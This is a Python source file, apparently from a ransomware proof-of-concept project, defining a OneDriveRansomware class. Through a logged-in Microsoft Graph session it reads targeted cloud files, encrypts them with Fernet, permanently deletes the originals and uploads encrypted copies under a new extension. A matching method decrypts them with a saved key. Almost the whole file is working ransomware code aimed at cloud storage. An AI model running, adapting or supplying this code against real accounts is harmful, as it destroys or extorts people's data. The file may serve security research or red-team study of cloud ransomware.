from cryptography.fernet import Fernet
from ransomware_utils.msgraph_objects import *
from datetime import datetime


class OneDriveRansomware:
    def __init__(self, logged_in_onedrive_session: MicrosoftGraphAPI, key_path: str):
        self._onedrive_session = logged_in_onedrive_session
        self.__key_path = key_path
        self.__key = None

    def start_ransomware(self, target_cloud_file_items: list[OneDriveFileItem], file_extension: str,
                         generate_key: bool):
        if generate_key:
            self.__generate_key()
            self.__save_key()
        else:
            self.__load_key()
        print(f"Starting to encrypt {len(target_cloud_file_items)} files")
        print(f"Encryption key: {self.__key}")
        for cloud_file_item in target_cloud_file_items:
            print("-" * 30)
            start_time = datetime.now()
            print(f"Handling: {cloud_file_item.full_path}")
            # read
            print("Reading remote file")
            file_content = self._onedrive_session.read_file_content(cloud_file_item)
            # encrypt
            print("Encrypting file content")
            file_new_content = self.__encrypt_data(file_content)
            # delete
            print("Deleting remote file")
            self._onedrive_session.permanent_delete_item(cloud_file_item)
            # upload
            print("Uploading encrypted file")
            self._onedrive_session.create_file(f"{cloud_file_item.full_path}{file_extension}", file_new_content)
            end_time = datetime.now()
            print(f"Total duration - {(end_time - start_time).seconds} seconds")

    def revert_ransomware(self, target_cloud_file_items: list[OneDriveFileItem], file_extension):
        self.__load_key()
        print(f"Starting to decrypt {len(target_cloud_file_items)} files")
        print(f"Decryption key: {self.__key}")
        for cloud_file_item in target_cloud_file_items:
            print("-" * 30)
            start_time = datetime.now()
            print(f"Handling: {cloud_file_item.full_path}")
            # read
            print("Reading remote file")
            file_content = self._onedrive_session.read_file_content(cloud_file_item)
            # encrypt
            print("Decrypting file content")
            file_new_content = self.__decrypt_data(file_content)
            # delete
            print("Deleting remote file")
            self._onedrive_session.permanent_delete_item(cloud_file_item)
            # upload
            print("Uploading decrypted file")
            self._onedrive_session.create_file(f"{cloud_file_item.full_path.removesuffix(file_extension)}", file_new_content)
            end_time = datetime.now()
            print(f"Total duration - {(end_time - start_time).seconds} seconds")

    def __save_key(self):
        try:
            with open(self.__key_path, "wb") as f:
                f.write(self.__key)
        except Exception as e:
            raise Exception(f"Encountered an issue while saving the key: {e}")

    def __load_key(self):
        try:
            with open(self.__key_path, "rb") as f:
                self.__key = f.read()
        except Exception as e:
            raise ValueError(f"Encountered an issue while reading the key: {e}")
        if not self.__key:
            raise ValueError("The key is empty. Make sure to set a key in the key file.")

    def __generate_key(self):
        self.__key = Fernet.generate_key()

    def __encrypt_data(self, file_content: bytes) -> bytes:
        return Fernet(self.__key).encrypt(file_content)

    def __decrypt_data(self, file_content: bytes) -> bytes:
        return Fernet(self.__key).decrypt(file_content)
    